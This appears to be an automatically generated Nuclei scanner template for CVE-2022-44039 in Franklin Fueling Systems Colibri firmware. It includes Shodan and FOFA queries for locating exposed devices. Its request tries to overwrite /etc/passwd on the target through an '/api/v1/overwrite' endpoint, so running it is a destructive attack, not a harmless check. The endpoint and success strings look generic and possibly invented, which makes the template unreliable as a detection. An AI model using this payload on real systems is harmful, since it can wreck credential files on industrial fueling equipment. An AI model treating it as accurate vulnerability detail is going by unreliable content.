id: CVE-2022-44039

info:
  name: Franklin Fueling System FFS Colibri Filesystem Overwrite Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: Franklin Fueling System FFS Colibri 1.9.22.8925 is affected by a filesystem overwrite vulnerability due to insecure usage of the "fopen" function with "wb" mode.
  impact: |
    Successful exploitation could lead to unauthorized access or denial of service.
  remediation: |
    Apply the vendor-supplied patch or update to mitigate the vulnerability.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-44039
    cwe-id: CWE-863
    epss-score: 0.00287
    epss-percentile: 0.69597
    cpe: cpe:2.3:o:franklinfueling:colibri_firmware:1.9.22.8925:*:*:*:*:*:*:*
  metadata:
    vendor: franklinfueling
    product: colibri_firmware
    shodan-query: http.html:"Franklin Fueling Systems"
    fofa-query: body="franklin fueling systems"

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/v1/overwrite"

    body: |
      {
        "file": "/etc/passwd",
        "content": "malicious_content_here"
      }

    headers:
      Content-Type: application/json
    matchers:
      - type: word
        words:
          - "File overwritten successfully"
          - "Operation completed"
        part: body
